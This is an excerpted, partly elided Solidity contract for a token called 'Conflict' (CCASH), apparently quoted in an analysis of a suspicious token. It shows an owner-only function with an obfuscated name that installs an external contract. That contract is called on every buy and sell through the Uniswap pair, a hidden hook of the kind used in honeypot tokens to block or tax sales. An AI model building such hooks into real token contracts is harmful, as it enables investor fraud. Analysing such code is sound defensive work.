...
contract TokenM is ERC20 {
    ...
    IUserAmountecordt public ecordt;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Conflict", "CCASH") {
    ...
    function ceocgeotBuongeRoeng(IUserAmountecordt _ecordt) public onlyOwner {
        ecordt = _ecordt;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                ecordt.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				ecordt.addOutAmount(from, amount);
            }else{
                ecordt.addOutAmount(from, amount);
                takeFee = false;
            }
